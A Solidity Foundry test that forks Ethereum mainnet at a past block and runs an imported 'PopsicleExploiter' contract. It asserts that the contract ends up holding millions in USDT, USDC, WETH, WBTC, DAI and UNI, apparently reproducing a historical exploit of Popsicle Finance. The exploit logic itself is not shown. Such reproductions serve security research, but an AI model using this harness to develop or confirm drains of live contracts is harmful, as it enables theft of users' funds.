// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/PopsicleExploiter.sol";

contract PopsicleTest is Test {
    IUSDT private constant USDT = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IWETH private constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20Like private constant WBTC = IERC20Like(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    IERC20Like private constant USDC = IERC20Like(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20Like private constant DAI = IERC20Like(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20Like private constant UNI = IERC20Like(0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984);

    PopsicleExploiter exploiter;

    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("mainnet"), 12955062);

        exploiter = new PopsicleExploiter();
    }

    function testExploit() public {
        exploiter.exploit();

        assertTrue(USDT.balanceOf(address(exploiter)) > 4_977_178e6);
        assertTrue(WETH.balanceOf(address(exploiter)) > 2_558e18);
        assertTrue(WBTC.balanceOf(address(exploiter)) > 96e8);
        assertTrue(USDC.balanceOf(address(exploiter)) > 5_393_020e6);
        assertTrue(DAI.balanceOf(address(exploiter)) > 159_928e18);
        assertTrue(UNI.balanceOf(address(exploiter)) > 10_485e18);
    }
}
